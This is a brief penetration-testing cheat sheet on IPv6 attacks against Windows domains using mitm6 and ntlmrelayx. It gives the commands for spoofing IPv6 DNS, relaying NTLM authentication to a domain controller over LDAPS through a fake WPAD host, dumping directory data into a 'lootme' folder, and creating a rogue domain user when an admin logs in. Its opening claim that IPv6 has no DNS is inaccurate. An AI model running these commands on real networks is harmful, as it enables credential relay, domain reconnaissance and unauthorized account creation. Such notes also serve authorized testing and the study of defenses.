#  IPv6 Attacks

There's no dns for IPv6 (only for IPv4) so we can spoof it with mitm6

## Mitm6

- Fetch it [here](https://github.com/dirkjanm/mitm6)
- mitm6 command
```mitm6 -d domain-name.local```
- ntlmrelay
```ntlmrelayx.py -6 -t ldaps://DOMAIN-CONTROLLER-IP -wh fakewpad.domain.local -l lootme```
- Once the attack is successful we get a folder lootme with plenty of info from the DC
- If during the attack and admin logs in win 10 machine, mitm6 will create a new user for us:
```[*] Adding new user with username: YrAjkDnwzM and password: SHq]d(88dr%5+3R result: OK```
